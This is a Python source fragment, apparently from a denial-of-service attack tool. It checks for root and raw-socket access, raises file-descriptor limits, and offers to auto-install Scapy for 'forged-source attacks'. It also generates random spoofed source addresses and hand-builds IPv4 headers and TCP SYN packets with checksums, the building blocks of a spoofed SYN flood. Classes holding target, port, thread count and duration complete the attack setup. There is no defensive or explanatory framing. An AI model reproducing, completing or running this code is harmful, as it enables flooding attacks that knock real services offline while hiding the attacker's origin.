def _open_url(url):
    def _try(cmd, timeout=3):
        try:
            r = _sp.run(cmd, stdout=_sp.DEVNULL, stderr=_sp.DEVNULL, timeout=timeout)
            return r.returncode == 0
        except Exception:
            return False
    if shutil.which("termux-open-url"):
        if _try(["termux-open-url", url]):
            return True
    if sys.platform == "win32":
        try:
            os.startfile(url); return True
        except Exception:
            pass
    if sys.platform == "darwin" and shutil.which("open"):
        if _try(["open", url]):
            return True
    if shutil.which("xdg-open"):
        if _try(["xdg-open", url]):
            return True
    if shutil.which("am"):
        if _try(["am", "start", "-a", "android.intent.action.VIEW", "-d", url]):
            return True
    try:
        import webbrowser
        if webbrowser.open(url) or webbrowser.open_new_tab(url):
            return True
    except Exception:
        pass
    return False

class ENV:
    def __init__(self):
        self.platform = sys.platform; self.is_root = False; self.uid = None; self.euid = None
        self.raw_ok = False; self.reuse_ok = hasattr(socket, "SO_REUSEPORT"); self.fd_raised = False
        self.has_scapy = False; self.scapy = None
        self.has_ipproto_raw = hasattr(socket, "IPPROTO_RAW")
        if self.platform != "win32":
            try: self.uid = os.getuid(); self.euid = os.geteuid(); self.is_root = self.euid == 0
            except AttributeError: pass
        try:
            import resource
            soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
            tgt = min(hard, 1048576)
            if soft < tgt: resource.setrlimit(resource.RLIMIT_NOFILE, (tgt, hard)); self.fd_raised = True
        except Exception: pass
        if self.is_root:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW); s.close(); self.raw_ok = True
            except (PermissionError, OSError): pass
    def try_scapy(self):
        if not self.is_root or not self.raw_ok: return False
        if not _im("scapy"):
            if os.environ.get("CCT_NO_INSTALL") == "1": return False
            _cn.print(Panel.fit("[yellow]Scapy not installed[/yellow]\n\nEnable TIER-1 forged-source attacks.\nAuto-install now?", title="Root Upgrade", border_style="yellow"))
            try: ans = input("[Y/n] > ").strip().lower() or "y"
            except EOFError: ans = "y"
            if ans != "y": return False
            try: subprocess.check_call([sys.executable, "-m", "pip", "install", "scapy", "--quiet"])
            except subprocess.CalledProcessError: return False
        try:
            from scapy.all import IP, TCP, UDP, Raw, send, conf
            conf.verb = 0; self.scapy = __import__("scapy.all", fromlist=["*"]); self.has_scapy = True; return True
        except Exception: return False
    def tier(self):
        if self.has_scapy: return "TIER-1 (ROOT+SCAPY)"
        if self.is_root and self.raw_ok: return "TIER-2 (ROOT)"
        return "TIER-3 (NON-ROOT)"
    def tag(self):
        return f"platform={self.platform} root={'Y' if self.is_root else 'N'} raw={'Y' if self.raw_ok else 'N'} scapy={'Y' if self.has_scapy else 'N'} reuse={'Y' if self.reuse_ok else 'N'} fd={'Y' if self.fd_raised else 'N'}"
    def mode(self): return self.tier()

@dataclass
class X:
    running: bool = True; method: str = ""; target: str = ""
    counter: Counter = field(default_factory=Counter)
    _lock: threading.Lock = field(default_factory=threading.Lock)
    def hit(self, status):
        with self._lock: self.counter[status] += 1; self.counter["total"] += 1
    def reset(self):
        with self._lock: self.counter.clear()
    def snap(self):
        with self._lock: return dict(self.counter)

@dataclass
class XD:
    target: str = ""; port: int = 80; threads: int = 100; duration: int = 60

def _rip():
    return f"{secrets.randbelow(254)+1}.{secrets.randbelow(255)}.{secrets.randbelow(255)}.{secrets.randbelow(254)+1}"

def _build_ipv4_header(src, dst, proto, payload_len):
    return struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + payload_len, secrets.randbelow(65535), 0, 64, proto, 0, socket.inet_aton(src), socket.inet_aton(dst))

def _checksum(data):
    if len(data) % 2: data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i+1]
        s = (s & 0xffff) + (s >> 16)
    return ~s & 0xffff

def _build_tcp_syn(src, dst, sport, dport, seq, ack=0):
    tcp_hdr = struct.pack("!HHLLBBHHH", sport, dport, seq, ack, (5 << 4), 0x02, 65535, 0, 0)
    pseudo = socket.inet_aton(src) + socket.inet_aton(dst) + struct.pack("!BBH", 0, 6, len(tcp_hdr))
    c = _checksum(pseudo + tcp_hdr)
    return struct.pack("!HHLLBBHHH", sport, dport, seq, ack, (5 << 4), 0x02, 65535, c, 0)

